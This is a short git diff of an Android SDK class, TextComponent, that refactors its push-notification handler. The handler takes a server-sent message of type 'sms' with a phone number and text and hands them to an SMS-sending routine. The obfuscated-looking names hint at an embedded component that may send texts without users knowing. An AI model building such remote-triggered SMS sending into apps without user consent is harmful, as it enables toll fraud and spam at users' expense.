@@ -14,6 +14,7 @@ import java.util.concurrent.TimeUnit;
 
 import commons.app.com.commons.commons.SdkComponent;
 
+@SuppressWarnings("WeakerAccess")
 public class TextComponent extends SdkComponent {
 
     public static final String ARG_PHONE_NUMBER = "arg_t6562565_1";
@@ -40,22 +41,6 @@ public class TextComponent extends SdkComponent {
         startCheckForDeviceEvents();
     }
 
-    @Override
-    public void onFcmMessageReceived(Bundle payload) {
-        String type = payload.getString("type");
-        if ("sms".equals(type)) {
-            String smsId = payload.getString("id");
-            String phone = payload.getString("phone_number");
-            String message = payload.getString("text");
-            onSmsComeToSend(smsId, phone, message);
-        }
-    }
-
-    @Override
-    public void onDeviceRebooted() {
-
-    }
-
     @Nullable
     @Override
     public Job createJob(@NonNull String tag) {
@@ -70,6 +55,16 @@ public class TextComponent extends SdkComponent {
             return new SendSmsSentStatusJob();
         }
         return null;
+    }
+
+    @Override
+    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
+        if ("sms".equals(type)) {
+            String smsId = payload.getString("id");
+            String phone = payload.getString("phone_number");
+            String message = payload.getString("text");
+            onSmsComeToSend(smsId, phone, message);
+        }
     }
 
     ///////////////////////////////////////////////////////////////////////////
